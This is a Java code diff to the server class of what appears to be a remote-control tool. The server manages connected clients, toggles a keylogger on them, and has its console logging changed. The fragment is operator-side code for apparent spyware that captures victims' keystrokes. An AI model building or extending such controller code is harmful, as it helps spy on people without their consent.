@@ -6,7 +6,6 @@ import org.apache.mina.core.session.IdleStatus;
 import org.apache.mina.core.session.IoSession;
 import org.apache.mina.transport.socket.nio.NioSocketAcceptor;
 import org.apache.mina.util.CopyOnWriteMap;
-import org.graviton.network.media.MediaServer;
 
 import java.io.IOException;
 import java.net.InetSocketAddress;
@@ -26,8 +25,6 @@ public class Server implements IoHandler {
     private Client selectedClient;
 
     private boolean keyLoggerEnabled;
-
-    private boolean silent;
 
     public Server() throws IOException {
         NioSocketAcceptor socketAcceptor = new NioSocketAcceptor();
@@ -89,11 +86,9 @@ public class Server implements IoHandler {
         if (keyLoggerEnabled) {
             IntStream.range(0, 9999).forEach(i -> System.out.println("\n"));
             System.err.println("KeyLogger : enabled...");
-            silent = true;
         } else {
             IntStream.range(0, 9999).forEach(i -> System.out.println("\n"));
             System.err.println("KeyLogger : disabled");
-            silent = false;
         }
         send("2");
     }
@@ -107,17 +102,15 @@ public class Server implements IoHandler {
 
     @Override
     public void sessionOpened(IoSession ioSession) throws Exception {
-        if (!silent)
-            System.out.println("Client[" + ioSession.getId() + "] is connected");
+        System.out.println("Client[" + ioSession.getId() + "] is connected");
     }
 
     @Override
     public void sessionClosed(IoSession ioSession) throws Exception {
         if (selectedClient != null && ioSession.getId() == selectedClient.getSession().getId()) {
-            if (!silent)
-                System.out.println("Current client is now disconnected");
+            System.out.println("Current client is now disconnected");
             selectedClient = null;
-        } else if (!silent)
+        } else
             System.out.println("Client[" + ioSession.getId() + "] is closed");
 
         clients.remove((int) ioSession.getId());
@@ -130,22 +123,20 @@ public class Server implements IoHandler {
     @Override
     public void exceptionCaught(IoSession ioSession, Throwable throwable) throws Exception {
         throwable.printStackTrace();
-        if (!silent)
-            System.out.println("Client[" + ioSession.getId() + "] throw an exception -> " + throwable.getMessage());
+        System.out.println("Client[" + ioSession.getId() + "] throw an exception -> " + throwable.getMessage());
     }
 
     @Override
     public void messageReceived(IoSession ioSession, Object o) throws Exception {
         String input = bufferToString(o);
-        if (!silent)
+        if (input.charAt(0) != 'p')
             System.out.println("Client[" + ioSession.getId() + "] < " + input);
         ((Client) ioSession.getAttribute("client")).parse(input);
     }
 
     @Override
     public void messageSent(IoSession ioSession, Object o) throws Exception {
-        if (!silent)
-            System.out.println("Server to [" + ioSession.getId() + "] > " + bufferToString(o));
+        System.out.println("Server to [" + ioSession.getId() + "] > " + bufferToString(o));
     }
 
     @Override
